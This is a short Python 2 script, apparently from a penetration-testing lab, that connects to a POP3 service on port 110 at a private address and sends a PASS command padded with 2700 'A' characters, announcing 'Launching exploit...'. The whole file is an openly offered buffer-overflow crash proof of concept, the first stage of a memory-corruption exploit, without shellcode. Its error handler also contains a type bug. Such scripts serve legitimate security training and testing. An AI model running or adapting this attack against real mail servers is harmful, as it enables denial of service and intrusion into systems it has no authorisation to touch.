#!/usr/bin/python

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = '10.11.25.153'
port = 110

buffer = 'A' * 2700
try:
    print "\nLaunching exploit..."
    s.connect((ip, port))
    data = s.recv(1024)
    s.send('USER username' +'\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print "\nFinished!."
except:
    print "Could not connect to "+ip+":"+port
